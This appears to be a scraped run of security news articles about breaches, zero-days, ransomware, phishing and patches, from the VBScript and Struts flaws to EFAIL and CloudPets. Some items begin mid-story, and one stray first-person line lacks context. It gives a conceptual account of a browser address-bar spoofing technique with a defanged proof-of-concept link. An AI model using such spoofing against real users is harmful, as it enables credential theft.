One of the more interesting parts of the attack is that it does not matter what a user's default browser is. When using VBScript, it is possible to force a web page to be loaded using Internet Explorer even if Chrome, FireFox, Safari, Opera or another browser is set to default. This particular vulnerability has been found in use and affects Windows 7 and Windows Server 2008 and newer.
Kasperksy Lab has provided a fairly detailed analysis of how the exploit functions. In short, a statement from their security researchers says it all. ""We expect this vulnerability to become one of the most exploited in the near future, as it won’t be long until exploit kit authors start abusing it in both drive-by (via browser) and spear-phishing (via document) campaigns.""
In addition to the VBScript flaw discovered and patched, Microsoft has also patched a privilege escalation vulnerability. A failure of the Win32k component allows for arbitrary code to be executed in kernel mode. This allows for a standard user account to obtain full system access, although it should be noted that a user must be logged in already to perform the exploit.
In this case, both exploits have been patched but that does not mean end users and administrators are going to patch their systems in a timely manner. It is advised to manually check for updates to verify that all of the latest patches are installed. In total, 67 updates were issued solving 21 critically rated vulnerabilities.

HipChat has reset all its users' passwords after what it called a security incident that may have exposed their names, email addresses and hashed password information.
In some cases, attackers may have accessed messages and content in chat rooms, HipChat said in a Monday blog post. But this happened in no more than 0.05 percent of the cases, each of which involved a domain URL, such as company.hipchat.com.
HipChat didn't say how many users may have been affected by the incident. The passwords that may have been exposed would also be difficult to crack, the company said. The data is hashed, or obscured, with the bcrypt algorithm, which transforms the passwords into a set of random-looking characters. For added security, HipChat ""salted"" each password with a random value before hashing it.
HipChat warned that chat room data including the room name and topic may have also been exposed. But no financial or credit information was taken, the company said.
HipChat is a popular messaging service used among enterprises, and an attack that exposed sensitive work-related chats could cause significant harm. 
The service, which is owned by Atlassian, said it detected the security incident last weekend. It affected a server in the HipChat Cloud and was caused by a vulnerability in an unnamed, but popular, third-party library that HipChat.com used, the company said. 
No other Atlassian systems were affected, the company said. “We are confident we have isolated the affected systems and closed any unauthorized access,” HipChat said in its blog post.
This is not the first time the messaging service has faced problems keeping accounts secure. In 2015, HipChat reset user passwords after detecting and blocking suspicious activity in which account information was stolen from less than 2 percent of its users.
When breaches occur, security experts advise users to change their passwords for any accounts where they used the same login information. Users can consider using a password manager to help them store complex, tough-to-memorize passwords. 
HipChat has already sent an email to affected users, informing them of the password reset.
In 2015, rival chat application Slack reported its own breach, and as a result rolled out two-factor authentication to beef up its account security. HipChat does not offer two-factor authentication.

The Guardian has drawn the ire of a large number of cryptography and security experts by publishing a story claiming that WhatsApp has a security backdoor that would allow it, or governments, to snoop on encrypted messages.
The group of experts, led by Associate Professor Zeynep Tufekci have written an open letter demanding that the article is retracted and for The Guardian to issue an apology for the misleading claims.
The article, written by freelance journalist Manisha Ganguly reported claims originally made by a UC Berkeley PhD student Tobias Boelter last year.
He showed that under certain conditions a government could, with the cooperation of WhatsApp, gain access to the content of a small number of messages.
The consensus of 40 of the most respected people from the security and cryptographic community however was that the behaviour described by PhD student Tobias Boelter, and sensationalised in The Guardian article, was simply a design decision taken by WhatsApp developers and represented a very small risk, if any, to the vast majority of users.
The Guardian has so far refused the demands of Professor Tufekci and her colleagues and simply updated the article changing the word “backdoor” for “vulnerability” and including a statement from WhatsApp stating categorically that “WhatsApp does not give governments a ‘backdoor’ into its systems and would fight any government request to create a backdoor”.
Tufekci made the point that The Guardian’s article had endangered people because they would switch to less secure forms of communication over concerns that governments could be potentially listening into conversations.
The suggestion that people should use the potentially more secure app Signal was not going to work for most people because it was less user-friendly and simply by using an app like Signal could actually alert government agencies that they had something to hide.
The Guardian article took the claims of a PhD student and failed to get input into the issue from a single recognised security or cryptography expert.
The opinions quoted in the article came from three people who, although involved with privacy at the policy and user level, were by no means subject matter experts and couldn’t possibly have claimed to understand what had been implemented.
In fact, Moxie Marlinspike, the developer behind Signal, the protocol that gives WhatsApp its end-to-end encryption also came out emphatically supporting WhatsApp’s implementation of the Signal Protocol.
The Guardian has since published several other articles about WhatsApp including one by Tobias Boelter attempting to justify the claims of there being a “vulnerability” in WhatsApp.
It is important to note that this story was not picked up and reported independently by other reputable mainstream media sites; a sure indication that other journalists weren’t buying into the claims.
Even the tech media didn’t report on it other than some sites simply reporting what The Guardian had claimed.

EOS has tweeted to confirm that it has patched “most” of the reported bugs and is “working hard” on the remainder. It expects the mainnet launch to stay on schedule.
Qihoo 360, a China-based internet security firm, says it has notified the EOS blockchain project about “a series of epic vulnerabilities” discovered on its platform.
The firm said in a Tuesday report that loopholes found in the EOS platform could expose nodes on the network to attackers, giving them the ability to execute code remotely and take “full control” of transactions. The firm claims that such an attack could potentially “decimate” the entire cryptocurrency network.
Qihoo 360 went on to explain that bad actors would be able to attack the network by constructing and publishing smart contracts containing malicious code on the EOS mainnet and have EOS supernodes pack them into new blocks.
Subsequently the code would affect all nodes on the network, including those of cryptocurrency wallets and exchanges, letting the attackers gain control of private keys to cryptocurrency transactions.
While EOS has not yet made any public comment on the issue, Qihoo 360 said in another blog update that the project’s lead developer, Daniel Larimer, was notified of the issues and that he has since said the vulnerabilities – identified as issue number 3498 on Github – have been fixed.
“If any of these asserts trigger in release it shouldn’t pass, but should throw. Allowing the code to continue running in release is a potential security vulnerability and will likely result in crashes elsewhere,” Larimer wrote on the Github page.
Meanwhile, Larimer has today appealed for more external assistance in identifying critical bugs in the system with the project’s mainnet launch just days away.

A flaw in Safari – that allows an attacker to spoof websites and trick victims into handing over their credentials – has yet to be patched.
A browser address bar spoofing flaw was found by researchers this week in Safari – and Apple has yet issue a patch for the flaw.
Researcher Rafay Baloch on Monday disclosed two proof-of-concepts revealing how vulnerabilities in Edge browser 42.17134.1.0 and Safari iOS 11.3.1 could be abused to manipulate the browsers’ address bars, tricking victims into thinking they are visiting a legitimate website.
Baloch told Threatpost Wednesday that Apple has promised to fix the flaw in its next security update for Safari. “Apple has told [me] that the latest beta of iOS 12 also addresses the issue, however they haven’t provided any dates,” he said. Apple did not respond to multiple requests for comment from Threatpost.
Microsoft for its part has fixed the vulnerability Baloch found in the Edge browser, (CVE-2018-8383) in its August Patch Tuesday release. According to Microsoft’s vulnerability advisory released August 14, the spoofing flaw exists because Edge does not properly parse HTTP content.
Both flaws stem from the Edge and Safari browsers allowing JavaScript to update the address bar while the page is still loading. This means that an attacker could request data from a non-existent port and, due to the delay induced by the setInterval function, trigger the address bar spoofing.
The browser would then preserve the address bar and load the content from the spoofed page, Baloch said in his blog breaking down both vulnerabilities.
From there, the attacker could spoof the website, using it to lure in victims and potentially gather credentials or spread malware. For instance, the attacker could send an email message containing the specially crafted URL to the user, convince the user to click it, and take them to the link which could gather their credentials or sensitive information.
“As per Google, Address bar is the only reliable indicator for ensuring the identity of the website, if the Address bar points to Facebook.com and the content is hosted on attacker’s website, there is no reason why someone would not fall for this,” Baloch told Threatpost.
In a video demonstration, Baloch showed how he could visit a link for the vulnerable browser on Edge (http://sh3ifu[.]com/bt/Edge-Spoof.html), which would take him to a site purporting to be Gmail login. However, while the URL points to a Gmail address, the content is hosted on sh3ifu.com, said Baloch.
The Safari proof-of-concept is similar, except for one constraint where it does not allow users to type their information into the input boxes while the page is in a loading state. However, Bolach said he was able to circumvent this restriction by injecting a fake keyboard using Javascript – a common practice in banking sites.
No other browsers – including Chrome or Firefox – were discovered to have the flaw, said Baloch. Baloch is known for discovering similar vulnerabilities in Chrome, Firefox and other major browsers in 2016, which also allowed attackers to spoof URLs in the address bar.
The vulnerabilities were disclosed to both Microsoft and Apple and Baloch gave both a 90-day deadline before he went public with the flaws. Due to the Safari browser bug being unpatched, Baloch said he has not yet released a Proof of Concept: “However considering there is a slight difference between the Edge browser POC and Safari, anyone with decent knowledge of Javascript can make it work on Safari,” he told us.

Another critical security hole has been found in Apache Struts 2, requiring an immediate update.
The vulnerability – CVE-2018-11776 – affects core code and allows miscreants to pull off remote code execution against vulnerable servers and websites. It affects all versions of Struts 2, the popular open-source framework for Java web apps.
The Apache Software Foundation has ""urgently advised"" anyone using Struts to update to the latest version immediately, noting that the last time a critical hole was found, the holes were being exploited in the wild just a day later. In other words, if you delay in patching, your organization will be compromised in short order via this bug, if you are running vulnerable systems.
It was that earlier flaw that led to a nightmare data breach from credit company Equifax after it failed to patch swiftly enough. The details of nearly 150 million people were exposed, costing the company more than $600m, so this is not something to be taken lightly.
The company that discovered the vulnerability – Semmle Security Research Team – warns that this latest one is actually worse that the one last year, which it also found. It has published a blog post with more information. Semmle found the hole back in April and reported it to Apache, which put out a patch in June that it has now pulled into formal updates (2.3.35 for those using version 2.3 and 2.5.17 for those on 2.5).
As mentioned, the vulnerability is in the core code and doesn't require additional plugins to work. It is caused by insufficient validation of untrusted user data in the core of the Struts framework, and can be exploited in several different ways.
Semmle says it has identified two different vectors but warns there may be others.

Since it can be used remotely and due to the fact that Struts is typically used to create applications that are on the public internet, hackers are going to be especially focused on exploiting it so they can gain access to corporate networks.
And there are some big targets out there: Apache Struts is extremely common with most large corporations using it somewhere in their systems for web apps.
Semmle's VP of engineering, Pavel Avgustinov, had this to say about the hole on Wednesday this week: ""Critical remote code execution vulnerabilities like the one that affected Equifax and the one we announced today are incredibly dangerous for several reasons: Struts is used for publicly-accessible customer-facing websites, vulnerable systems are easily identified, and the flaw is easy to exploit. A hacker can find their way in within minutes, and exfiltrate data or stage further attacks from the compromised system. It’s crucially important to update affected systems immediately; to wait is to take an irresponsible risk.""
This is very far from the first time that big security holes have been found in Struts, leading some to recommend that people simply stop using it.

Over 700 computers at all of SLPL's 16 branches have been hit.
According to library spokesperson Jen Hatton, SLPL doesn't intend to pay the ransom, which is around $35,000, about $50 per infected PC.
Instead, library technicians plan to wipe and reinstall all computers from the ground up, an operation that might take a while, several local news outlets have reported [1, 2, 3, 4].
Hatton said the infection took root on the night between Wednesday and Thursday.
By the next day, the library had to shut down all book returns and checkout operations.
SLPL libraries also served as public WiFi access points, allowing people to come in and use its Internet connection or computers to surf the web.
Internet access is also down, as the ransomware hit those servers as well, along with the staff's email system.
It is unknown if the ransomware infection took place because of the library's staff or because of a user that used its public computers.
A request for comment sent by Bleeping Computer wasn't answered at the time of publishing.
UPDATE [January 23]: SLPL announced today they started recovering some of the locked computers and are slowly resuming service.
I've been trying since this morning to get in contact with them.

 For weeks, perhaps months, hackers could take control of a victim's' computer, or install malware on it, just by tricking them into opening a booby-trapped document, thanks to a critical ""zero-day"" bug in most versions of Microsoft Word. 
 When bugs are unknown to the vendor, and still unpatched, they're called zero-days. That's their value: they will work no matter what, as there's no fix for them. Criminal hackers, as well as hackers working for governments, sometimes use zero-days, but it's rare for the same zero-day exploit to be used by both groups.
 Somehow, however, that's what happened with that Microsoft Word zero-day. The exploit was used by government hackers, likely inside Russia, to target victims and infect them with the infamous FinFisher spyware since at least late January. The same exploit, according to security firm FireEye, was also used by a criminal gang spreading malware known as Latentbot in March.
 To add even more mystery to the mix, it appears that multiple researchers independent of each other found the original bug on which the exploit was developed. When Microsoft patched it on Tuesday, it credited three researchers, as well as its own internal teams. That's not unheard of, but as a recent study pointed out, it's rare for different teams or researchers to find the same bug, something that's known as ""bug-collision."" 
 Ryan Hanson, a security researcher, claimed in a tweet that he originally found it in July and disclosed it to Microsoft in October. Hanson did not respond to a request for comment, but Motherboard was able to confirm this timeline. 
 For some reason, however, Microsoft didn't patch it until this week. (For example, previous office bugs found by Google Project Zero got patched within 90 days.)
 The company said in a statement that they heard of a ""small number"" of targeted attacks in the wild using the exploit ""approximately one month ago,"" and added that there were no widespread attacks until McAfee disclosed the bug publicly last Saturday.
 ""This was a complex investigation that took time to thoroughly investigate and patch,"" a Microsoft spokesperson told Motherboard. ""We performed an investigation to identify other potentially similar methods, and ensure that our fix addresses more than just the issue reported."" 
 It's unclear who developed the exploit used to spread FinFisher and Latentbot, but it's possible that the same developer sold it to both groups.
 ""I think whoever sells to FinFisher also does blackmarket business,"" said John Hultquist, a researcher at FireEye. ""Talent, tools, and techniques move between espionage, criminal, and hacktivist worlds.""
 As the CEO of Hacking Team, a company that used to buy zero-day exploits, once said, ""exclusive zero-days don't exist.""
""Talent, tools, and techniques move between espionage, criminal, and hacktivist worlds.""
 A source who works in the surveillance technology industry said that FinFisher buys exploits from private researchers as well as from Zerodium, a well-known exploit seller. The source, who asked to remain anonymous, said FinFisher recently offered access to an exploit subscription portal that seemed similar to what Zerodium's predecessor, Vupen, used to offer. Zerodium's founder Chaouki Bekrar declined to comment. (FinFisher did not respond to a request for comment.)

 The exploit, which has now been patched, affected customers banking with hundreds of financial institutions
US-based financial services firm Fiserv has just fixed a flaw in its web platform that exposed the personal and financial details of a vast number of banking customers.
With more than 12,000 clients across the world using the company's services, it is hard to establish how many customers' details were exposed in the 'information disclosure vulnerability' found by security researcher Kristian Erik Hermansen.
When logging into his local bank, which uses Fiserv's platform, Hermansen learned email alerts for financial transactions were assigned an 'event number', which he successfully predicted were distributed in sequence, according to KrebsOnSecurity.
Using this knowledge, the researcher was able to directly view alerts set up by another customer by rewriting the site's code in his browser and sending a request for an altered event number. He was able to view the customer's email address, phone number and bank account number - as well as view and edit alerts they had previously set up.
""I shouldn't be able to see this data,"" he said. ""Anytime you spend money that should be a private transaction between you and your bank, not available for everyone else to see."" He added a criminal could have exploited the flaw to steal information from customers.
 Together with KrebsOnSeceurity author Brian Krebs, Hermansen worked to verify whether or not the flaw was exclusive to his own bank's installation of the platform. They soon discovered hundreds of other Fiserv-affiliated banks may have been just as vulnerable as those they had tested.
IT Pro approached Fiserv for comment, and to establish how many institutions in the UK may have been affected, if any, but the company did not respond at the time of writing. A spokesperson told Krebs that Fiserv had responded accordingly, and corrected the issue.
""After receiving your email, we promptly engaged appropriate resources and worked around the clock to research and remediate the situation,"" the spokesperson said.
""We developed a security patch within 24 hours of receiving notification and deployed the patch to clients that utilise a hosted version of the solution. We will be deploying the patch this evening to clients that utilise an in-house version of the solution.""
While information disclosure vulnerabilities are among the most common types of website security issues, according to Krebs, they are also the most preventable and easy to fix. But they can also cause just as much damage to a company's brand as more severe security risks.

The bugs let hackers crash IoT devices, leak their information, and completely take them over.
Researchers have found that a popular Internet of Things real-time operating system – FreeRTOS – is riddled with serious vulnerabilities.
The bugs could allow hackers to crash connected devices in smart homes or critical infrastructure systems, leak information from the devices’ memory, and take them over. And while patches have been issued, researchers warn that it still may take time for smaller vendors to update.
Researcher Ori Karliner, with Zimperium’s zLabs team, recently analyzed some of the leading operating systems in the IoT market – including FreeRTOS, an open-source OS specifically designed for the microcontrollers that are within IoT devices. Within several versions of FreeRTOS, Karliner found 13 vulnerabilities enabling an array of attacks, including remote code execution, information leak and denial-of-service bugs.
“During our research, we discovered multiple vulnerabilities within FreeRTOS’s TCP/IP stack and in the AWS secure connectivity modules. The same vulnerabilities are present in WHIS Connect TCP/IP component for OpenRTOS\SafeRTOS,” according to a Thursday post by zLabs.
The vulnerabilities specifically exist in FreeRTOS’s TCP/IP stack and in the AWS secure connectivity modules (in as well as in the WHIS Connect TCP/IP component for OpenRTOS\SafeRTOS).
These vulnerabilities include four remote code execution bugs (CVE-2018-16522, CVE-2018-16525, CVE-2018-16526, and CVE-2018-16528); seven information leak vulnerabilities (CVE-2018-16524, CVE-2018-16527, CVE-2018-16599, CVE-2018-16600, CVE-2018-16601, CVE-2018-16602, CVE-2018-16603) one denial of service flaw (CVE-2018-16523) and a final (CVE-2018-16598) that was unspecified.
zLabs said it has disclosed the security issues to Amazon and collaborated with them to patch the vulnerabilities. Those fixes were deployed for AWS FreeRTOS versions 1.3.2 and onwards. The vulnerabilities in RTOS WHIS were also patched.
Amazon did not respond to a request for comment from Threatpost.
Due to the amount of vendors impacted by the bugs, the researchers said that they would hold off on publishing further details until all holes have been sealed.

Ransomware has largely been an opportunistic, rather than a targeted, form of cybercrime with the goal of infecting as many users as possible.
That model has worked so effectively that extortion is now ubiquitous when it comes to cybercrime — so much so that even fake attacks are proving to be successful.
As I wrote earlier this month, the surge of extortion attacks impacting organizations has led to a number of fake extortion threats, including empty ransomware demands where actors contact organizations, lie about the organization’s data being encrypted, and ask for money to remove the non-existent threat.
Cybercriminals like to follow the path of least resistance, and an attack doesn’t get much easier than simply pretending to have done something malicious.
However, attacks over the past year have proven that infecting organizations with ransomware can result in much higher payouts.
The more disruptive the attack, the more money some organizations are willing to pay to make the problem go away.
As a result, ransomware actors are shifting their targets towards more disruptive attacks, which we examine in our latest report, Ransomware Actors Shift Gears: New Wave of Ransomware Attacks Aims to Lock Business Services, Not Just Data.
It was just 13 months ago that Hollywood Presbyterian Medical Center made national attention by paying $17,000 to decrypt its files after a ransomware attack.
The incident was novel at the time, but those types of stories have since become commonplace.
Organizations need to take action to protect themselves against ransomware actors that are trying to find more effective ways to disrupt business operations and demand even higher ransom payouts.

It's been quiet since 2015, but TorrentLocker has suddenly returned.
And this time it wants to steal your passwords too.
Cybercriminals are always adding new malicious tricks to ransomware.
A ransomware variant which has been relatively inactive for almost two years is back, and this time it's stealing user credentials from victims in addition to demanding a ransom to unencrypt locked files.
TorrentLocker -- also known as Cryptolocker -- started targeting Windows users in 2014 before dropping off by the summer of 2015.
Like the majority of ransomware schemes,  TorrentLocker spreads via spam email messages  containing malicious attachments.
Rising Bitcoin prices force Cryptolocker ransomware scammers to drop asking price
Bitcoin's wild fluctuations have forced a price update to the Cryptolocker ransomware.
If the victim enables the macros by choosing to 'Enable Editing', a PowerShell code is executed and the ransomware is downloaded, encrypting the victims' files until they pay a ransom.
But that isn't where the malicious activity ends, because as noted by cybersecurity researchers at Heimdal Security, this incarnation of TorrentLocker has new features, including the ability to spread itself to other computers via shared files; something which could see the ransomware taking over a whole network in a very short space of time.
In addition to holding networks to ransom, the new version of TorrentLocker also harvests usernames and passwords from infected computers, putting businesses at risk of cyberespionage and data breaches, while users could see their personal or financial information leaked and sold to cybercriminals on the dark web.
The researchers warn that the revived TorrentLocker campaign is ""very aggressive"" and that many well known antivirus software products haven't been updated to protect against it, even days after the campaign began.
Heimdal Security warns users in its native Denmark that they're being highly targeted by TorrentLocker.
Indeed, it appears that European internet users are the main target for those behind the campaign, as Microsoft told BleepingComputer that Italy is by far the most targeted by the perpetrators.

An unsecured Kubernetes container management console allowed cyber-attackers to breach a Tesla cloud account that contained sensitive data, including telemetry data from the company’s electric cars, according to a report by security company RedLock. 
Details about Tesla cloud account breach where included in RedLock report as an example of the cyber-security threats face enterprises that store sensitive data and run important business applications on cloud services. 
RedLock’s Cloud Security Intelligence team found that the Tesla breach resulted from the exposure of Amazon Web Services security credentials after hackers penetrated Tesla’s Kubernetes console, which was not password protected This led to the exposure of the company’s Amazon S3 cloud account, which contained sensitive data including the Tesla vehicle telemetry. 

What was most remarkable about the CSI report was that the problems that affect on premises infrastructure are the same ones that affect cloud infrastructure. The difference is that most organizations have learned over the years to provide at least some level of protection for their on premises infrastructure and assets. Unfortunately, it appears that the same isn’t true of their cloud resources. 
Part of the problem, it appears, comes from a lack of familiarity with managing cloud services. But security for those services does exist is readily available. Amazon, for example regularly sends out emails to AWS users explaining what security measures, products and services are available for its cloud environments. 
Unlike private, on-premises environments, the public cloud is just that—public. That means it can be accessed by anyone, including an attacker that possesses the credentials that can enable access from anywhere. What that means is that access security is even more important, because you have no means of preventing a criminal from trying to gain access. 
But it also means that monitoring your cloud environment is just as important as your on premises physical environment. Monitoring at least provides a way to find an attacker that’s gotten past your access controls. The CSI team also recommends a “deny all” setting on your firewall for outbound cloud traffic, and setting your cloud so that configuration changes are automatically reported. 
The key here is to remember that while the cloud provider can play a role in helping ensure your cloud is secure, they can’t do it alone. It’s your part of the cloud, your data, and you’re paying for those computing assets. It’s your job to make sure they’re secure.

Enigmail and GPG Tools have been patched for EFAIL. For more up-to-date information, please see EFF's Surveillance Self-Defense guides.
Don’t panic! But you should stop using PGP for encrypted email and switch to a different secure communications method for now.
A group of researchers released a paper today that describes a new class of serious vulnerabilities in PGP (including GPG), the most popular email encryption standard. The new paper includes a proof-of-concept exploit that can allow an attacker to use the victim’s own email client to decrypt previously acquired messages and return the decrypted content to the attacker without alerting the victim. The proof of concept is only one implementation of this new type of attack, and variants may follow in the coming days.
Because of the straightforward nature of the proof of concept, the severity of these security vulnerabilities, the range of email clients and plugins affected, and the high level of protection that PGP users need and expect, EFF is advising PGP users to pause in their use of the tool and seek other modes of secure end-to-end communication for now.
Because we are awaiting the response from the security community of the flaws highlighted in the paper, we recommend that for now you uninstall or disable your PGP email plug-in. These steps are intended as a temporary, conservative stopgap until the immediate risk of the exploit has passed and been mitigated against by the wider community. There may be simpler mitigations available soon, as vendors and commentators develop narrower solutions, but this is the safest stance to take for now. Because sending PGP-encrypted emails to an unpatched client will create adverse ecosystem incentives to open incoming emails, any of which could be maliciously crafted to expose ciphertext to attackers.
While you may not be directly affected, the other participants in your encrypted conversations are likely to be. For this attack, it isn’t important whether the sender or the receiver of the original secret message is targeted. This is because a PGP message is encrypted to both of their keys.
At EFF, we have relied on PGP extensively both internally and to secure much of our external-facing email communications. Because of the severity of the vulnerabilities disclosed today, we are temporarily dialing down our use of PGP for both internal and external email.
Our recommendations may change as new information becomes available, and we will update this post when that happens.

Noticed more emails and texts lately claiming to be from your bank – and not just yours? You’re not the only one.
Action Fraud, the UK police’s dedicated fraud tracking team, has revealed a significant increase in reports about phishing attacks connected to TSB’s massive IT outage have been reported.
A total of 176 complaints have been received, or around ten a day since April 30. “There has been an uptick in phishing attempts across the piece,” says an Action Fraud spokesperson.
TSB’s banking meltdown, caused by a botched IT upgrade, still has not been remedied – nearly four weeks on. And the crisis has become paydirt for scammers and hackers, who have waded into a confusing, chaotic situation and are making out with thousands of pounds worth of savings from people’s accounts. And it’s not just TSB - the number of phishing texts claiming to be from other banks such as Barclays and NatWest also seems to be on the rise.
“When a ‘change’ goes wrong and so publicly like TSB’s, it’s like cyber blood in the water,” explains Ian Thornton-Trump, chief technical officer of Octopi Managed Services, an IT company. “Cyber criminals pay attention to companies rocked by internal scandals or public ‘ball drops’ and react accordingly.”
With the bank’s staff overloaded trying to fix the problems that caused the outage in the first place, fraudulent transactions aren’t being tracked or checked as quickly as they should be. “It is a sad fact that fraudsters might try to take advantage of situations like these,” says a TSB spokesperson.
The scammers are using one of the most common tools in their arsenal: phishing attacks. They send out mass texts and emails to customers – many of whom identify themselves as TSB’s customers in increasingly irate social media posts – with links to legitimate-sounding but fraudulent websites.
Customers are encouraged to click a link and input their username and password to process their complaints against the company – and lose control of their bank account.
Lucy Evans, 23, is one customer who has had her cash stolen. Her TSB current account was looted, and she’s received a number of texts purporting to be from TSB. She was defrauded by a combination of phone calls and texts. “I think I was targeted whilst we couldn’t actually view our money,” says Evans.
“Criminals are happy to exploit people’s misery, whatever form that might take,” says professor Alan Woodward, a cybersecurity specialist from the University of Surrey. “Criminals can pretend to be the bank and ask customers to undertake strange actions that under normal operations would seem suspicious. Customers might be so delighted to actually be able to access their web banking that they might just let their guard down that little bit more than usual.”
TSB has to act more proactively to shut down fraudulent domains and to make the public more aware of the scams circulating, Woodward argues. “TSB need to up their game in responding to customers – as that very lack of response can be used to lure customers in.”

That’s a key question swirling around Spiral Toys, a company behind a line of smart stuffed animals that security researchers worry can be easily hacked.
On Tuesday, Spiral Toys said the breach, which affects 800,000 user accounts, only came to its attention last week on Feb 22.
One researcher named Victor Gevers began contacting the toymaker about the problem in late December, when he noticed that a company MongoDB database storing customer information was publicly exposed.
Gevers has even documented his efforts to contact Spiral Toys, which involved email, sending a message to its CEO over a LinkedIn invite, and working with a journalist from Vice Media to try and warn the company about the breach.
Despite those attempts, he never received a response.
The breach only managed to grab headlines on Monday when another security researcher named Troy Hunt blogged about it.
The toys in question, which are sold under the CloudPets brand, can allow parents and their children to send voice messages through the stuffed animals over the internet.
However, Hunt found evidence that hackers looted the exposed MongoDB database that stored the toys' customer login information.
“Anyone with the data could crack a large number of passwords, log on to accounts and pull down the voice recordings,” he said.
Its CEO Mark Meyers said on Tuesday that the company has checked its email inboxes, but didn’t find any messages from security researchers warning about the breach.
It appears that several hackers have looted the exposed database from Spiral Toys, according to Hunt.
Although the passwords exposed in the breach are hashed, cracking them can be easy, because many of them were created with guessable terms such as 123456, qwerty and cloudpets, he said.

Flipkart has recently posted a story to make people aware of fake Flipkart websites. The e-commerce giant on its blog 'Flipkart stories' said that people need to be beware of email, call, SMS, WhatsApp message or any social media message which claims to be offering unbelievable discounts and offers from Flipkart. Flipkart said: “Be warned that these messages are not sent by official Flipkart channels, but by fraudsters and scammers who intend to deceive you. If you are not careful, you may be at the receiving end of fraud. Fraudsters intend to make a fast buck by misappropriating the familiar and trustworthy name of Flipkart. You are advised not to trust these fraudulent individuals or agencies with your money, or your personal and financial information. Always check with authentic and original Flipkart sources first.”
The content of the fake messages or calls sent by the fraudulent may include references to tempting deals, discounts and offers on Flipkart. The fake messages may closely resemble the Flipkart’s official logos, typefaces and brand colour while some may also contain the word ‘Flipkart’ in the URL. Then how can you catch them?
1) Fake websites: The websites such as ‘flipkart.dhamaka-offers.com, flipkart-bigbillion-sale.com’ contain the name of the company in their URL. Such websites pretend to be associated with Flipkart by using similar-looking and similar-sounding names. However, they are not authorised by Flipkart.
2) WhatsApp, Facebook Messenger and/or other social messaging platforms: Fraudsters may try to send the customers messages via social messaging platforms and many have also reported the same. These imposters will ask for your personal details or will be asked to share these fraudulent messages with friends and family members to win prizes. Apart from these customers might also be offered products at ‘unbelievable’ prices such as a 32 GB pen drive for Rs 25. Customers will be asked to make payments via online wallets, bank transfer or other means to avail free gifts.
To this, Flipkart has directed the customers to not reply to these messages or click any of the links the fake messages contain without verifying it with the company. “Flipkart has no connection with these fraudulent senders, and we have no control over any information that you share with them. Any details that you share with these fraudulent senders that impersonate Flipkart can compromise your personal and financial information. Payments once made to these accounts cannot be retrieved or reversed, and you may be cheated of your hard-earned money,” the e-commerce website said.
3) Fake Calls or SMS to customers: Sometimes, customers may also receive calls from an unknown number. The may speak in any language such as English, Hindi among others. The person might lure customers by offering free gifts or by saying that your mobile number has been selected via a lucky draw, etc. To avail these gifts, the imposter will ask you for your personal details and access to bank account numbers among other things. They may also lure you to a website appearing very similar to Flipkart or send you a fake fabricated certificate.
They may also claim to be Flipkart employees or partners and may display fake identifiation as proof. “It is easy to fabricate such documents in order to make you believe that they are genuine. You may also be asked to transfer money to certain digital wallets to claim prizes or gifts. Note that these accounts are not managed by Flipkart, but by fraudsters who want to cheat you,” Flipkart said.
4) Phishing (Fake Emails): Phishing is a fraudulent attempt to obtain sensitive information such as usernames, passwords, and credit card details for malicious reasons by disguising as a trustworthy entity in an electronic communication. Phishing emails are sent by fraudsters. The emails may ask you to visit malicious links through which your personal and/or financial information can be obtained and be used without your consent to carry out fraudulent transactions. You may lose money, personal and sensitive information and your systems — desktop computers, laptops or mobile phones — can get potentially compromised by malware/viruses upon opening or clicking on links in such emails.
5) Online games/websites (discount coupons/gift vouchers/offers/online games): Online scams of this type reach out to customers, asking them to play games such as ‘spin the wheel,’ which promise free gifts, cash prizes, and other tempting bait. The players are often asked to share the game with their contacts to be able to avail the prize, which, of course, never materializes.
6) From Marketplace Sellers: While you may have received an order placed on Flipkart, you may receive a pamphlet or inserts, asking you to make future purchases on some other online shopping site or portal to avail higher discounts. Similarly, sellers/callers posing as sellers may ask you to place an order directly with them and may ask for payment to be made directly. Often, they may ask you to cancel your Flipkart order. Once you agree to any such deal with these fraudulent sellers, Flipkart will not have any control over any information you might share with them. You are at risk of fraud if you accept such offers.

LastPass engineers have Google researcher Tavis Ormandy to thank yet again for another busy few days after the British white hat found a second critical bug in the password manager.
Ormandy tweeted over the weekend that he began ‘working’ on the research in an unusual location:
“Ah-ha, I had an epiphany in the shower this morning and realized how to get codeexec in LastPass 4.1.43. Full report and exploit on the way.”
On Monday, LastPass responded by explaining that the Google Project Zero man had reported a new client-side vulnerability in its browser extension.
“We are now actively addressing the vulnerability. This attack is unique and highly sophisticated,” it added.
“We don’t want to disclose anything specific about the vulnerability or our fix that could reveal anything to less sophisticated but nefarious parties. So you can expect a more detailed post mortem once this work is complete.”
The firm offered a few steps that users could take to protect themselves from client-side security issues.
These include: launching sites directly from the LastPass vault; switching on two-factor authentication for any site that offers it; and to be constantly on the lookout for phishing attacks.
It’s the second vulnerability in a week that Ormandy has reported to LastPass.
Last week, the password manager firm was forced to fix a critical zero day that would have allowed remote code execution, enabling an attacker to steal users’ passwords.
The prolific Ormandy also helped to make the firm more secure last year when he found “a bunch of obvious critical problems” in the service.
Yet he has also publicly appeared to query the logic of using an online service which, if breached, could give up its customers’ passwords.
One Twitter follower claimed at the time: “I'm perplexed anyone uses an online service to store passwords.” Ormandy responded: “Yeah, me too.”

Yesterday we wrote about a “Google Docs” phishing campaign that aimed to trick you into authorising a malicious third-party Gmail app so that it could take over your email account and your contact list for its own ends.
One of those ends seems to have been to spam out another wave of those same fraudulent emails to your friends and colleagues, in the hope of getting them to authorise the imposter app, and thus to send out another wave of emails, and another, and so on.
Technically, that made it more than just a “phish”, which we’ll define very loosely here as an email that aims to trick, coerce or cajole you into performing an authentication task, or giving away personal data, that you later wish you hadn’t.
 The classic old-school example of a phish is an email that tells you that you have lost money to fraud, or gained money from a tax refund, so please use this web link to login to your bank account to sort this out. These days, however, the word phishing is generally understood much more broadly, describing any sort of misdirection that gets you to authorise or to give away something you should have kept private. Many users have learned to avoid login links in emails, so the crooks have broadened the range of threats and incentives by which they phish for access to your online life.
This week’s so-called “Google Docs” attack could spread all by itself, helped on by users giving it the permission it needed along the way, just like the infamous Love Bug virus from 2000, or the pernicious FriendGreetings adware from 2002.
Technically, then, that makes the “Google Docs” attack a virus, or more specifically a worm, which is a special sort of virus that spreads by itself, without needing pre-existing host files to hook onto.

Samsung, being a large multinational company, makes a lot of products spread across various spheres of life and marketed to diverse segments in a multitude of countries.
Over here on XDA-Developers, Samsung is famously known for their Android smartphones and tablets, given they are some of the top contenders for their respective product categories.
Samsung also makes many more interesting electronics, including a few “smart” ones that run on its own open-source OS, Tizen OS.
